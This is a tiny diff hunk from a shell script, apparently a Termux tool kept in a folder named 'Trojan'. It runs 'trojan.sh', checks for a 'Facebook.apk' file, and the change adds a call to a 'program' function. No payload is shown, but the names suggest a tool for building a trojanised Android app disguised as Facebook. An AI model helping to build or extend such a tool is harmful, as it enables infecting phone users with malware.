@@ -253,7 +253,7 @@ sleep 0.5
 cd - > /dev/null 2>&1
 bash trojan.sh
 fi
-fi ; }
+fi ; } ; program
 
 if [ ! -f "/data/data/com.termux/files/home/Trojan/database/Facebook.apk" ];then
 echo
